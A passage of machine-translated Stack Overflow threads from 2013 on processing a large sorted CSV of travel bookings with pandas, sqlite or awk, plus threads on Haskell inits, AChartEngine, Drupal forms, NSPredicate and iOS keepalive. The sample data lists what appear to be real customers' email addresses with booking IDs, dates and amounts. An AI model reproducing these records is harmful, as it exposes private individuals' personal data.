"DF","0000650000@YAHOO.COM","NF2513521438550","01JAN2013","B2C","6792"
"Bus","00009.GAURAV@GMAIL.COM","NU27012932319739","26JAN2013","B2C","800"
"Rail","0000.ANU@GMAIL.COM","NR251764697526","24JUN2011","B2C","595"
"Rail","0000MANNU@GMAIL.COM","NR251277005737","29OCT2011","B2C","957"
"Rail","0000PRANNOY0000@GMAIL.COM","NR251297862893","21NOV2011","B2C","212"
"DF","0000PRANNOY0000@YAHOO.CO.IN","NF251327485543","26JUN2011","B2C","17080"
"Rail","0000RAHUL@GMAIL.COM","NR2512012069809","25OCT2012","B2C","5731"
"DF","0000SS0@GMAIL.COM","NF251355775967","10MAY2011","B2C","2000"
"DF","0001HARISH@GMAIL.COM","NF251352240086","22DEC2010","B2C","4006"
"DF","0001HARISH@GMAIL.COM","NF251742087846","12DEC2010","B2C","1000"
"DF","0001HARISH@GMAIL.COM","NF252022031180","09DEC2010","B2C","3439"
"Rail","000AYUSH@GMAIL.COM","NR2151120122283","25JAN2013","B2C","136"
"Rail","000AYUSH@GMAIL.COM","NR2151213260036","28NOV2012","B2C","41"
"Rail","000AYUSH@GMAIL.COM","NR2151313264432","29NOV2012","B2C","96"
"Rail","000AYUSH@GMAIL.COM","NR2151413266728","29NOV2012","B2C","96"
"Rail","000AYUSH@GMAIL.COM","NR2512912359037","08DEC2012","B2C","96"
"Rail","000AYUSH@GMAIL.COM","NR2517612385569","12DEC2012","B2C","96" 
```

以上是样本数据。数据根据电子邮件地址排序，文件非常大，大约 1.5Gb

我想在另一个 csv 文件中输出类似这样的内容

```
"DF","00000000@11111.COM","FLTINT1000130394756","26JUL2010","B2C","6799.2",1,0 days
"Rail","00000.POO@GMAIL.COM","NR251764697478","24JUN2011","B2C","2025",1,0 days
"DF","0000650000@YAHOO.COM","NF2513521438550","01JAN2013","B2C","6792",1,0 days
"Bus","00009.GAURAV@GMAIL.COM","NU27012932319739","26JAN2013","B2C","800",1,0 days
"Rail","0000.ANU@GMAIL.COM","NR251764697526","24JUN2011","B2C","595",1,0 days
"Rail","0000MANNU@GMAIL.COM","NR251277005737","29OCT2011","B2C","957",1,0 days
"Rail","0000PRANNOY0000@GMAIL.COM","NR251297862893","21NOV2011","B2C","212",1,0 days
"DF","0000PRANNOY0000@YAHOO.CO.IN","NF251327485543","26JUN2011","B2C","17080",1,0 days
"Rail","0000RAHUL@GMAIL.COM","NR2512012069809","25OCT2012","B2C","5731",1,0 days
"DF","0000SS0@GMAIL.COM","NF251355775967","10MAY2011","B2C","2000",1,0 days
"DF","0001HARISH@GMAIL.COM","NF251352240086","09DEC2010","B2C","4006",1,0 days
"DF","0001HARISH@GMAIL.COM","NF251742087846","12DEC2010","B2C","1000",2,3 days
"DF","0001HARISH@GMAIL.COM","NF252022031180","22DEC2010","B2C","3439",3,10 days
"Rail","000AYUSH@GMAIL.COM","NR2151213260036","28NOV2012","B2C","41",1,0 days
"Rail","000AYUSH@GMAIL.COM","NR2151313264432","29NOV2012","B2C","96",2,1 days
"Rail","000AYUSH@GMAIL.COM","NR2151413266728","29NOV2012","B2C","96",3,0 days
"Rail","000AYUSH@GMAIL.COM","NR2512912359037","08DEC2012","B2C","96",4,9 days
"Rail","000AYUSH@GMAIL.COM","NR2512912359037","08DEC2012","B2C","96",5,0 days
"Rail","000AYUSH@GMAIL.COM","NR2517612385569","12DEC2012","B2C","96",6,4 days
"Rail","000AYUSH@GMAIL.COM","NR2517612385569","12DEC2012","B2C","96",7,0 days
"Rail","000AYUSH@GMAIL.COM","NR2151120122283","25JAN2013","B2C","136",8,44 days
"Rail","000AYUSH@GMAIL.COM","NR2151120122283","25JAN2013","B2C","136",9,0 days 
```

即，如果条目第一次出现，我需要附加 1 如果它出现第二次，我需要附加 2，同样我的意思是我需要计算文件中电子邮件地址的出现次数，如果电子邮件存在两次或更多，我想要差异在日期和记住**日期之间没有排序**，所以我们还必须根据特定的电子邮件地址对它们进行排序，我正在使用 numpy 或 pandas 库或任何其他可以处理这种类型的海量数据而不会放弃的库在 python 中寻找解决方案绑定内存异常我有双核处理器，centos 6.3，内存为 4GB

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-19T17:34:29.773

确保你有 0.11，阅读这些文档：[http](http://pandas.pydata.org/pandas-docs/dev/io.html#hdf5-pytables) ://pandas.pydata.org/pandas-docs/dev/io.html#hdf5-pytables和这些食谱： http: [//pandas.pydata.org/pandas- docs/dev/cookbook.html#hdfstore](http://pandas.pydata.org/pandas-docs/dev/cookbook.html#hdfstore)（尤其是“合并数百万行”

这是一个似乎有效的解决方案。这是工作流程：

1.  按块从 csv 读取数据并附加到 hdfstore
2.  遍历存储，这将创建另一个执行组合器的存储

本质上，我们从表中取出一个块，并与文件其他每个部分的一个块组合在一起。组合器函数不会减少，而是计算该块中所有元素之间的函数（以天为单位的差异），消除重复项，并在每次循环后获取最新数据。几乎有点像递归减少。

在您的情况下，这应该是 O(num_of_chunks**2) 内存和计算时间块大小可以说是 1m（或更多）

```
processing [0] [datastore.h5]
processing [1] [datastore_0.h5]
    count                date  diff                        email
4       1 2011-06-24 00:00:00     0           0000.ANU@GMAIL.COM
1       1 2011-06-24 00:00:00     0          00000.POO@GMAIL.COM
0       1 2010-07-26 00:00:00     0           00000000@11111.COM
2       1 2013-01-01 00:00:00     0         0000650000@YAHOO.COM
3       1 2013-01-26 00:00:00     0       00009.GAURAV@GMAIL.COM
5       1 2011-10-29 00:00:00     0          0000MANNU@GMAIL.COM
6       1 2011-11-21 00:00:00     0    0000PRANNOY0000@GMAIL.COM
7       1 2011-06-26 00:00:00     0  0000PRANNOY0000@YAHOO.CO.IN
8       1 2012-10-25 00:00:00     0          0000RAHUL@GMAIL.COM
9       1 2011-05-10 00:00:00     0            0000SS0@GMAIL.COM
12      1 2010-12-09 00:00:00     0         0001HARISH@GMAIL.COM
11      2 2010-12-12 00:00:00     3         0001HARISH@GMAIL.COM
10      3 2010-12-22 00:00:00    13         0001HARISH@GMAIL.COM
14      1 2012-11-28 00:00:00     0           000AYUSH@GMAIL.COM
15      2 2012-11-29 00:00:00     1           000AYUSH@GMAIL.COM
17      3 2012-12-08 00:00:00    10           000AYUSH@GMAIL.COM
18      4 2012-12-12 00:00:00    14           000AYUSH@GMAIL.COM
13      5 2013-01-25 00:00:00    58           000AYUSH@GMAIL.COM
import pandas as pd
import StringIO
import numpy as np
from time import strptime
from datetime import datetime

# your data
data = """
"DF","00000000@11111.COM","FLTINT1000130394756","26JUL2010","B2C","6799.2"
"Rail","00000.POO@GMAIL.COM","NR251764697478","24JUN2011","B2C","2025"
"DF","0000650000@YAHOO.COM","NF2513521438550","01JAN2013","B2C","6792"
"Bus","00009.GAURAV@GMAIL.COM","NU27012932319739","26JAN2013","B2C","800"
"Rail","0000.ANU@GMAIL.COM","NR251764697526","24JUN2011","B2C","595"
"Rail","0000MANNU@GMAIL.COM","NR251277005737","29OCT2011","B2C","957"
"Rail","0000PRANNOY0000@GMAIL.COM","NR251297862893","21NOV2011","B2C","212"
"DF","0000PRANNOY0000@YAHOO.CO.IN","NF251327485543","26JUN2011","B2C","17080"
"Rail","0000RAHUL@GMAIL.COM","NR2512012069809","25OCT2012","B2C","5731"
"DF","0000SS0@GMAIL.COM","NF251355775967","10MAY2011","B2C","2000"
"DF","0001HARISH@GMAIL.COM","NF251352240086","22DEC2010","B2C","4006"
"DF","0001HARISH@GMAIL.COM","NF251742087846","12DEC2010","B2C","1000"
"DF","0001HARISH@GMAIL.COM","NF252022031180","09DEC2010","B2C","3439"
"Rail","000AYUSH@GMAIL.COM","NR2151120122283","25JAN2013","B2C","136"
"Rail","000AYUSH@GMAIL.COM","NR2151213260036","28NOV2012","B2C","41"
"Rail","000AYUSH@GMAIL.COM","NR2151313264432","29NOV2012","B2C","96"
"Rail","000AYUSH@GMAIL.COM","NR2151413266728","29NOV2012","B2C","96"
"Rail","000AYUSH@GMAIL.COM","NR2512912359037","08DEC2012","B2C","96"
"Rail","000AYUSH@GMAIL.COM","NR2517612385569","12DEC2012","B2C","96"
"""

# read in and create the store
data_store_file = 'datastore.h5'
store = pd.HDFStore(data_store_file,'w')

def dp(x, **kwargs):
    return [ datetime(*strptime(v,'%d%b%Y')[0:3]) for v in x ]

chunksize=5
reader = pd.read_csv(StringIO.StringIO(data),names=['x1','email','x2','date','x3','x4'],
                     header=0,usecols=['email','date'],parse_dates=['date'],
                     date_parser=dp, chunksize=chunksize)

for i, chunk in enumerate(reader):
    chunk['indexer'] = chunk.index + i*chunksize

    # create the global index, and keep it in the frame too
    df = chunk.set_index('indexer')

    # need to set a minimum size for the email column
    store.append('data',df,min_itemsize={'email' : 100})

store.close()

# define the combiner function
def combiner(x):

    # given a group of emails (the same), return a combination
    # with the new data

    # sort by the date
    y = x.sort('date')

    # calc the diff in days (an integer)
    y['diff'] = (y['date']-y['date'].iloc[0]).apply(lambda d: float(d.item().days))
    y['count'] = pd.Series(range(1,len(y)+1),index=y.index,dtype='float64')  

    return y

# reduce the store (and create a new one by chunks)
in_store_file = data_store_file
in_store1 = pd.HDFStore(in_store_file)

# iter on the store 1
for chunki, df1 in enumerate(in_store1.select('data',chunksize=2*chunksize)):
    print "processing [%s] [%s]" % (chunki,in_store_file)

    out_store_file = 'datastore_%s.h5' % chunki
    out_store = pd.HDFStore(out_store_file,'w')

    # iter on store 2
    in_store2 = pd.HDFStore(in_store_file)
    for df2 in in_store2.select('data',chunksize=chunksize):

        # concat & drop dups
        df = pd.concat([df1,df2]).drop_duplicates(['email','date'])

        # group and combine
        result = df.groupby('email').apply(combiner)

        # remove the mi (that we created in the groupby)
        result = result.reset_index('email',drop=True)

        # only store those rows which are in df2!
        result = result.reindex(index=df2.index).dropna()

        # store to the out_store
        out_store.append('data',result,min_itemsize={'email' : 100})
    in_store2.close()
    out_store.close()
    in_store_file = out_store_file

in_store1.close()

# show the reduced store
print pd.read_hdf(out_store_file,'data').sort(['email','diff']) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-19T17:33:31.920

使用内置的[sqlite3](http://docs.python.org/2/library/sqlite3.html)数据库：您可以根据需要插入数据、排序和分组，使用大于可用 RAM 的文件没有问题。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-04-19T20:04:03.633

另一种可能的（系统管理员）方式，避免数据库和 SQL 查询以及对运行时进程和硬件资源的大量要求。

**更新 20/04**添加了更多代码和简化方法：-

1.  [将时间戳转换](https://stackoverflow.com/questions/6819601/convert-datetime-in-to-epoch-using-awk-piped-data)为秒（来自 Epoch）并使用 UNIX `sort`，使用 email 和这个新字段（即`sort -k2 -k4 -n -t, < converted_input_file > output_file`：）
2.  初始化 3 个变量`EMAIL`,`PREV_TIME`和`COUNT`
3.  遍历每一行，如果遇到新电子邮件，添加“1,0 天”。更新`PREV_TIME=timestamp`，，，`COUNT=1`_`EMAIL=new_email`
4.  下一行：3 种可能的情况
    *   a) 如果相同的电子邮件，不同的时间戳：计算天数，递增 COUNT=1，更新 PREV_TIME，添加“Count, Difference_in_days”
    *   b）如果相同的电子邮件，相同的时间戳：增加 COUNT，添加“COUNT，0 天”
    *   c) 如果是新邮件，从 3 开始。

1\. 的替代方法是添加一个新字段 TIMESTAMP 并在打印出该行时将其删除。

注意：如果 1.5GB 太大而无法一次排序，请将其拆分为更小的卡盘，使用电子邮件作为拆分点。您可以在不同的机器上并行运行这些块

```
/usr/bin/gawk -F'","' ' { 
    split("JAN FEB MAR APR MAY JUN JUL AUG SEP OCT NOV DEC", month, " "); 
    for (i=1; i<=12; i++) mdigit[month[i]]=i; 
    print $0 "," mktime(substr($4,6,4) " " mdigit[substr($4,3,3)] " " substr($4,1,2) " 00 00 00"
)}' < input.txt |  /usr/bin/sort -k2 -k7 -n -t, > output_file.txt 
```

输出文件.txt：

> "DF","00000000@11111.COM","FLTINT1000130394756","26JUL2010","B2C","6799.2",1280102400 "DF","0001HARISH@GMAIL.COM","NF252022031180","09DEC2010"," B2C","3439",1291852800 "DF","0001HARISH@GMAIL.COM","NF251742087846","12DEC2010","B2C","1000",1292112000 "DF","0001HARISH@GMAIL.COM"," NF251352240086","22DEC2010","B2C","4006",1292976000
> ...

您将输出通过管道传输到 Perl、Python 或 AWK 脚本以处理步骤 2 到 4。

# variables - Haskell 中的全局变量

> ID：16110257
> 
> 赞同：-1
> 
> 时间：2013-04-19T17:24:36.677
> 
> 标签：variables, haskell, binding

我有这个功能：

```
map(\x -> l ++ [x]) "Show" where l = "" 
```

我希望在 map 函数的每一步都保存 l 的值（例如，我不想返回`["S","h","o","w"]`，我希望它返回`["S","Sh","Sho","Show"]`）

有人能帮我吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-19T17:29:43.580

你快到了：

```
inits (x:xs) = map (\ys -> x:ys) ([]:inits xs)
inits [] = [] 
```

但请注意，您可以重写`(\ys -> x:ys)`为`(x:)`，它放在`x`它遇到的每个列表的前面，给出

```
inits (x:xs) = map (x:) ([]:inits xs)
inits [] = [] 
```

之所以有效，是因为`map (x:) ([]:inits xs)`给了你`(x:[]) : map (x:) (inits xs)`，所以列表中的所有内容都以 . 开头`x`，而第一个就是`[x]`. 也是如此`inits xs`，因此每个元素都更长。

## 有一个标准功能

像往常一样，你不是第一个想要这个的人，这就是为什么这个函数已经在`Data.List`. 您需要做的就是添加

```
import Data.List 
```

到程序的顶部，您将获得`inits`预定义。

## 那里的 inits 是如何定义的？

现在，如果您为此查找 hoogle，[http:](http://www.haskell.org/hoogle/?q=inits) //www.haskell.org/hoogle/?q=inits您可以点击查找

```
inits                   :: [a] -> [[a]]
inits xs                =  [] : case xs of
                                  []      -> []
                                  x : xs' -> map (x :) (inits xs') 
```

这几乎是完全相同的想法，但是在一个 case 语句中，它将模式匹配移动到函数内部。

请注意，这与您想要的略有不同，因为您`[]`的答案前面有 a，但您可以使用`tail`它来摆脱它。

```
myinits = tail.inits 
```

## 你怎么能找到是否已经有一个函数？

您想将列表转换为列表列表。那应该有 type `[a]->[[a]]`。您可以在 hoogle http://www.haskell.org/hoogle/?hoogle=[a]+-%3E+[[a]] 上搜索它，这是最佳答案（更一般地说，它可能会更低，而你' d 必须浏览一下。

这适用于许多标准功能，因为 hoogle 索引所有基础作为开始。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-19T17:28:42.003

使用`scanl`：

```
Prelude> scanl (\a c -> a++[c]) "" "Show"
["","S","Sh","Sho","Show"] 
```

一个高效的版本：

```
Prelude> map reverse . scanl (flip (:)) [] $ "Show"
["","S","Sh","Sho","Show"] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-19T17:30:33.043

使用[`Data.List.inits`](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-List.html#v%3ainits)：

```
> tail $ inits "Show"
["S","Sh","Sho","Show"] 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-19T17:31:16.673

只需结合 Prelude 中的 inits 和 tail 函数：

```
tail . inits $ "Show" 
```

# android - AChartEngine 总是 GC

> ID：16110258
> 
> 赞同：1
> 
> 时间：2013-04-19T17:24:37.640
> 
> 标签：android, achartengine

我正在使用AChartEngine绘制动态图。但是我发现手机无法显示图表视图并且logcat一直在输出GC信息。我的 TestData.SENSOR_HISTORY_DATA 只有 8 对 value-time。任何人都知道如何解决这个问题？ACE 版本是 1.0。

我从 ChartFactory 获得了一个图形视图，然后将其添加到我自己的线性布局中。

这是我的代码：</p>

```
public class HistoryDataChartDisp extends Activity {

    private XYSeries series;
    private XYMultipleSeriesDataset mDataset;
    private GraphicalView chart;
    private XYMultipleSeriesRenderer renderer;
    private HistoryDataParser histDataParser = new HistoryDataParser();
    private LinearLayout layout;
    private List<String> histValueList;
    private List<String> histTimeList;
    private SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.history_data_chart_layout);
        ini();
        updateChart();
    }

    private void ini() 
    {
        layout = (LinearLayout)findViewById(R.id.history_data_chart_linearLayout);

        series = new XYSeries("Title");

        mDataset = new XYMultipleSeriesDataset();

        renderer = buildRenderer(Color.GREEN, PointStyle.POINT, true);

        setBasicChartSettings(renderer);

        mDataset.addSeries(series);
        //get the chart
        chart = ChartFactory.getCubeLineChartView(getApplicationContext(), mDataset, renderer, 0.5f);

        layout.addView(chart, new LayoutParams(LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT));//将图表添加到布局中去
    }

    protected void setBasicChartSettings(XYMultipleSeriesRenderer basicRenderer) 
    {
        basicRenderer.setAxesColor(getResources().getColor(R.color.mirror));
        basicRenderer.setLabelsColor(getResources().getColor(R.color.mirror));
        basicRenderer.setLabelsTextSize(15);
        basicRenderer.setXLabels(5);
        basicRenderer.setYLabels(10);
        basicRenderer.setYLabelsAlign(Align.LEFT);
        basicRenderer.setShowGrid(true);
        basicRenderer.setGridColor(getResources().getColor(R.color.lightgray));

        basicRenderer.setMargins(new int[]{0,0,10,0});
        basicRenderer.setMarginsColor(getResources().getColor(R.color.ivory));

        basicRenderer.setPointSize(1);
        basicRenderer.setShowLegend(false);

        basicRenderer.setPanEnabled(false);
        basicRenderer.setZoomEnabled(false);

    }
    protected XYMultipleSeriesRenderer buildRenderer(int color, PointStyle style, boolean fill) 
    {       
        XYMultipleSeriesRenderer renderer = new XYMultipleSeriesRenderer();

        XYSeriesRenderer r = new XYSeriesRenderer();
        r.setColor(color);
        r.setPointStyle(style);
        r.setFillPoints(fill);
        r.setLineWidth(2);
        renderer.addSeriesRenderer(r);

        return renderer;
    }

    public void updateChart() {
        //For test
        //TestData.SENSOR_HISTORY_DATA is a String like this:value1,time1;value2,time2;...
        //
        updateData(TestData.SENSOR_HISTORY_DATA);
        chart.invalidate();
    }

    private void updateData(String response) 
    {
        histDataParser.parse(response);
        histValueList = histDataParser.getHistValueList();//get all values String
        histTimeList = histDataParser.getHistTimeList();//get all time String in same order with histValueList

        mDataset.removeSeries(series);

        series.clear();

        double x=0,y=0;

        int listSize = histTimeList.size();

        if(listSize<1)
        {
            series.add(0, 0);
        }
        else 
        {
            for (int i = listSize - 1; i >= 0 ; i--) 
            {
                try
                {
                    x = formatter.parse(histTimeList.get(i)).getTime();
                    y = Float.parseFloat(histValueList.get(i));
                } catch (ParseException e) {
                    e.printStackTrace();
                    x = 0;y = 0;
                }finally{
                    series.add(x, y);
                }
            }
        }
        mDataset.addSeries(series);
    }
} 
```

这是 logcat 信息。

```
 .
    .
    .
    05-19 14:07:35.269: D/dalvikvm(26285): GC_FOR_MALLOC freed 21755 objects / 524280 bytes in 35ms
    05-19 14:07:35.359: D/dalvikvm(26285): GC_FOR_MALLOC freed 21755 objects / 524280 bytes in 33ms
    05-19 14:07:35.449: D/dalvikvm(26285): GC_FOR_MALLOC freed 21755 objects / 524280 bytes in 33ms
    .
    .
    .
    (keep outputing) 
```

另外，我得到了这个： Listview 中有[很多垃圾收集](https://stackoverflow.com/questions/5977718/lots-of-garbage-collection-in-a-listview)。该问题的原因是 android:cacheColorHint="#00000000"。所以我想如果我可以做些什么来减少 GC 操作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-20T08:13:12.023

它是我的运行代码，请检查它。

公共类 MainActivity 扩展 Activity {

```
 public static final String TYPE = "type";
private final XYMultipleSeriesDataset mDataset = getDemoDataset();
private final XYMultipleSeriesRenderer mRenderer = getDemoRenderer();
private GraphicalView mChartView;

@SuppressWarnings("deprecation")
@Override
protected void onCreate(final Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    setRendererStyling();
    if (mChartView == null) {
        final LinearLayout layout = (LinearLayout) findViewById(R.id.chart);
        mChartView = ChartFactory.getLineChartView(this, mDataset,
                mRenderer);
        // mRenderer.setSelectableBuffer(100);
        layout.addView(mChartView, new LayoutParams(
                LayoutParams.FILL_PARENT, LayoutParams.FILL_PARENT));
    } else
        mChartView.repaint();
}

private void setRendererStyling() {
    mRenderer.setApplyBackgroundColor(true);
    mRenderer.setBackgroundColor(Color.TRANSPARENT);
    mRenderer.setMargins(new int[] { 0, 0, 0, 0 });
    mRenderer.setZoomButtonsVisible(true);
    mRenderer.setPointSize(10);
    mRenderer.setMarginsColor(Color.WHITE);
    mRenderer.setGridColor(Color.RED);
}

private XYMultipleSeriesDataset getDemoDataset() {
    // double[] seriesFirstY = { 20, -20, 67, 180, -45, 24, 99, -34, -8 };
    final double[] seriesSecondY = { 10, 80, -40, -20, 135, 24, 199, -34, 80, 23,
            45, 34, 232, 234, 234, 2, 4, 2, 2, 4, 45, 45, 4, 534, 3, 4, 54,
            44, 54, 343, 34, 234, 3, 4, 4, 3, 645, 654, 34, 45, 34, 3, 34,
            34, 34, 34, 34, 34, 34, 3, 4, 34, 4, 34, 34, 34, 34, 43, 34,
            34, 10, 80, -40, -20, 135, 24, 199, -34, 80, 23, 45, 34, 232,
            234, 234, 2, 4, 2, 2, 4, 45, 45, 4, 534, 3, 4, 54, 44, 54, 343,
            34, 234, 3, 4, 4, 3, 645, 654, 34, 45, 34, 3, 34, 34, 34, 34,
            34, 34, 34, 3, 4, 34, 4, 34, 34, 34, 34, 43, 34, 34, 34, 43,
            34, 34, 10, 80, -40, -20, 135, 24, 199, -34, 80, 23, 45, 34,
            232, 234, 234, 2, 4, 2, 2, 4, 45, 45, 4, 534, 3, 4, 54, 44, 54,
            343, 34, 234, 3, 4, 4, 3, 645, 654, 34, 45, 34, 3, 34, 34, 34,
            34, 34, 34, 34, 3, 4, 34, 4, 34, 34, 34, 34, 43, 34, 34, 34,
            43, 34, 34, 10, 80, -40, -20, 135, 24, 199, -34, 80, 23, 45,

            34, 43, 34, 34, 34, 43, 34, 34, 10, 80, -40, -20, 135, 24, 199,
            -34, 80, 23, 45, 34, 232, 234, 234, 2, 4, 2, 2, 4, 45, 45, 4,
            534, 3, 4, 54, 44, 54, 343, 34, 234, 3, 4, 4, 3, 645, 654, 34,
            45, 34, 3, 34, 34, 34, 34, 34, 34, 34, 3, 4, 34, 4, 34, 34, 34,
            34, 43, 34, 34, 34, 43, 34, 34, 10, 80, -40, -20, 135, 24, 199,
            -34, 80, 23, 45, 34, 232, 234, 234, 2, 4, 2, 2, 4, 45, 45, 4,
            534, 3, 4, 54, 44, 54, 343, 34, 234, 3, 4, 4, 3, 645, 654, 34,
            45, 34, 3, 34, 34, 34, 34, 34, 34, 34, 3, 4, 34, 4, 34, 34, 34,
            34, 43, 34, 34 };

    final XYMultipleSeriesDataset dataset = new XYMultipleSeriesDataset();

    final XYSeries secondSeries = new XYSeries("Graph");
    for (int j = 0; j < seriesSecondY.length; j++)
        secondSeries.add(j, seriesSecondY[j]);
    dataset.addSeries(secondSeries);
    return dataset;
}

private XYMultipleSeriesRenderer getDemoRenderer() {
    final XYMultipleSeriesRenderer renderer = new XYMultipleSeriesRenderer();
    final XYSeriesRenderer r = new XYSeriesRenderer();
    r.setPointStyle(PointStyle.POINT);
    r.setColor(Color.GREEN);
    renderer.addSeriesRenderer(r);
    renderer.setAxesColor(Color.TRANSPARENT);
    renderer.setLabelsColor(Color.TRANSPARENT);
    return renderer;
} 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-19T17:49:26.780

不用担心 - GC 只是 Android 垃圾收集系统。它总是在每台设备的后台运行。更有可能的是，GC 只是输出可用的内存和收集的内存。

# drupal-7 - 节点/添加和节点/编辑页面的不同表单覆盖？

> ID：16110265
> 
> 赞同：0
> 
> 时间：2013-04-19T17:24:58.303
> 
> 标签：drupal-7, drupal-forms

希亚

我在自定义模块中使用以下内容为我的 BABY 内容类型自定义节点/添加/婴儿页面上的表单，但是当它是婴儿的节点/nid/编辑页面时，我想对此页面进行一些细微的修改内容类型。这可能吗？

```
<code>
<?php
function concept_theme() {
  return array(
    'baby_node_form' => array(
      'arguments' => array(
          'form' => NULL,
      ),
      'template' => 'templates/baby-node-form',
      'render element' => 'form',
    ),
  );
}
?>
</code> 
```

感谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-26T03:49:09.777

在模板.php

```
function my_theme_name_theme($existing, $type, $theme, $path)
$hooks['baby_node_form']=array(
    'render element'=>'form',
    'template'      =>'templates/node--baby-edit',
);
return $hooks;
} 
```

在节点--baby-edit.tpl.php

隐藏这样的字段：

```
<?php hide($form['title']); ?> 
```

像这样操作字段：

```
<?php print render($form['field_image']); ?> 
```

使用它来打印所有/其余内容：

```
<?php print drupal_render_children($form); ?> 
```

清除缓存。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-22T13:34:01.470

您可以通过实现此钩子来更改节点创建表单，类似于以下内容：

```
hook_form_alter(&$form, &$form_state, $form_id) {
  if($form_id == 'node_baby_form') {
     //do modification to form array $form
  }
} 
```

或者，如果您的节点是由 hook_node_info 定义的（我认为不是这种情况），只需更改 hook_form() 中的元素

# ios - NSPredicate 遍历关系（StackMob）

> ID：16110266
> 
> 赞同：3
> 
> 时间：2013-04-19T17:24:59.200
> 
> 标签：ios, objective-c, nspredicate, nsfetchrequest, stackmob

我一直在搜索 Apple 的 Predicate Programming Guide 和 SO，试图确定为某个获取请求编写谓词的正确方法。

似乎我尝试使用点符号来遍历关系的方式没有得到请求的尊重。

```
NSEntityDescription *entity = [NSEntityDescription entityForName:@"Task" inManagedObjectContext:context];

[fetchRequest setEntity:entity];

NSPredicate *predicate = [NSPredicate predicateWithFormat:@"project.user == %@", self.user];

[fetchRequest setPredicate:predicate]; 
```

* * *

用户、项目和任务都是映射到 BaaS 提供商 (StackMob) 的核心数据实体。

关系如下：**用户** *一对多* **Project** *一对多* **Task**与您期望的反向关系。我想要做的是获取当前登录用户的所有任务。所以，我的想法是：发送带有实体“任务”的获取请求。如果拥有该任务的项目归登录用户所有，则获取该任务并显示它。很简单。

而且我认为我*应该*能够在上面显示的谓词中使用点表示法，但是获取请求返回 nil。

关于获取请求的其他一切都很好。如果我将格式字符串更改为`@"project != NULL"`，我会恢复所有任务。

我只是错误地写了我的格式字符串吗？向 StackMob 发送获取请求时，点表示法是否无效？

与往常一样，非常感谢任何帮助。

如果需要更多信息，请告诉我。我现在离这个有点太近了，看不清楚。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-19T20:08:31.450

StackMob 不支持获取关系的属性（project.user == X 的任务）。但是，您似乎正在尝试为登录用户获取给定项目的所有任务。如果我假设登录用户是创建项目和任务的用户是正确的，那么将项目架构的权限设置为“允许 sm_owner”。然后，您可以根据项目 ID 获取任务（项目 IN 1234 的任务），或基于 ID 的项目并获取所有任务（项目 ID == 1234 并使用任务关系的值）。无论哪种方式，使用该权限提取只会返回 sm_owner == 登录用户的结果，因此您无需设置提取以使其使用用户 ID 作为过滤器。希望有帮助！

# gis - OpenLayers 聚类在缩放时将特征添加到选定的特征数组

> ID：16110268
> 
> 赞同：2
> 
> 时间：2013-04-19T17:25:02.760
> 
> 标签：gis, openlayers

尽管使用 StackExchange 几年了，但这是我发布的第一个问题。我被困了很长一段时间，试图用 OpenLayers 解决这个问题。问题如下：

我在地图上绘制了一堆特征，并且能够以各种方式选择特征（例如在它们周围画一个框、单击各个特征、输入一个邮政编码以选择该邮政编码中的所有特征等）。这一切都很好。问题是我在要素图层上有一个聚类策略，当我缩小时，当前选定的要素与未选定的要素聚集在一起，当我放大时，那些未选定的要素将被选中。我想要完成的是聚类后​​不会选择先前未选择的特征。

![在此处输入图像描述](https://i.stack.imgur.com/VsTQ5.jpg)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:44:12.803

这种行为（在使用选定的集群放大后保留子特征的选择）深深地隐藏在 Strategy.Cluster 代码中。一种解决方案是深入研究 Strategy.Cluster 的代码并使其记住*真正*选择的功能，并仅选择放大时的功能（实际上 - 在重新聚类或调用 Strategy.Cluster.cluster() 时）。其次是通过订阅事件 featureselected 并在 zoomend 上重新选择功能来跟踪 openlayers 之外的所选功能。

# ios - setKeepAliveTimeout:600 处理程序：

> ID：16110269
> 
> 赞同：0
> 
> 时间：2013-04-19T17:25:03.450
> 
> 标签：ios, voip

我正在开发一个简单的 VoIP 应用程序，但无法理解它是如何工作的。这是我的 AppDelegate.m

```
#import "AppDelegate.h"

#import "ViewController.h"

@implementation AppDelegate

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
    // Override point for customization after application launch.
    if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPhone) {
        self.viewController = [[ViewController alloc] initWithNibName:@"ViewController_iPhone" bundle:nil];
    } else {
        self.viewController = [[ViewController alloc] initWithNibName:@"ViewController_iPad" bundle:nil];
    }

    self.window.rootViewController = self.viewController;
    [self.window makeKeyAndVisible];

    // Set-up scheduled background check-in.
    [[UIApplication sharedApplication] setKeepAliveTimeout:600 handler:^{
        //do your task
        NSLog(@"startingKeepAliveTimeout");

    }];
    return YES;
}

- (void)applicationWillResignActive:(UIApplication *)application
{

}

- (void)applicationDidEnterBackground:(UIApplication *)application
{
    // Set-up scheduled background check-in.
    [[UIApplication sharedApplication] setKeepAliveTimeout:600 handler:^{
        //do your task
        NSLog(@"startingKeepAliveTimeout");

    }];

}

- (void)applicationWillEnterForeground:(UIApplication *)application
{
    [[UIApplication sharedApplication] clearKeepAliveTimeout];
    NSLog(@"stoppingKeepAliveTimeout");
}

- (void)applicationDidBecomeActive:(UIApplication *)application
{

}

- (void)applicationWillTerminate:(UIApplication *)application
{

}

@end 
```

